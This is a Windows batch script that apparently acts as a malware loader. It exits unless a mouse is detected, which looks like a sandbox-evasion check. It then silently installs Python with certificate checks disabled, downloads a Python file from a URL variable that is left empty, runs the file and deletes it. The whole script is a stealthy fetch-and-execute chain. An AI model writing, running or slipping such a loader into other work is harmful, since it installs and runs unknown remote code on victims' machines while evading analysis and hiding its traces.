@echo off
setlocal EnableDelayedExpansion

set "mouseConnected=false"

for /f "tokens=2 delims==" %%I in ('wmic path Win32_PointingDevice get PNPDeviceID /value ^| find "PNPDeviceID"') do (
    set "mouseConnected=true"
)

if not !mouseConnected! == true (
    exit /b 1
)

set "PYTHON_URL=https://www.python.org/ftp/python/3.10.0/python-3.10.0rc2-amd64.exe"
set "PYTHON_INSTALLER=python-installer.exe"

curl -L -o !PYTHON_INSTALLER! !PYTHON_URL! --insecure --silent
start /wait !PYTHON_INSTALLER! /quiet /passive InstallAllUsers=0 PrependPath=1 Include_test=0 Include_pip=1 Include_doc=0
del !PYTHON_INSTALLER!

set "ENCODED_URL="

set "OUTPUT_FILE=webpage.py"
curl -o %OUTPUT_FILE% -s %ENCODED_URL% --insecure

if %ERRORLEVEL% neq 0 (
    echo Error: Failed to download the webpage.
    exit /b 1
)

python %OUTPUT_FILE%

del %OUTPUT_FILE%